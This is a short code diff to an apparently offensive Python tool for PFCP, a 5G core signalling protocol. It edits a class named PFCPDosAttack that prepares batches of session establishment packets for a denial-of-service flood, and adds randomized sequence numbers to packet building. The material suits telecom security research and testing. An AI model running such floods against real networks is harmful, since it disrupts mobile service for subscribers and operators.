@@ -133,7 +133,7 @@ class Ez_PFCP:
         src_port = src_port or self.src_port
         dest_port = dest_port or self.dest_port
         seid = seid or self.seid
-        seq = self.new_seq()
+        seq = self.new_seq(randomize=random_seq)
         
         pfcp_session_establishment_req = self.Build_PFCP_session_establishment_req(
             src_addr=src_addr,
@@ -256,7 +256,8 @@ class PFCPDosAttack:
             self.pfcp_establishment_packet_list.append(pfcp_obj.Build_PFCP_session_establishment_req(
                 seid=self.new_seid(), 
                 ue_addr=self.new_ue_addr(),
-                teid=self.new_teid()))
+                teid=self.new_teid()
+                ))
         print(f"[DoS] Prepared the PFCP association setup packet")
         print(f"[DoS] Prepared {count} PFCP session establishment packets")
                 
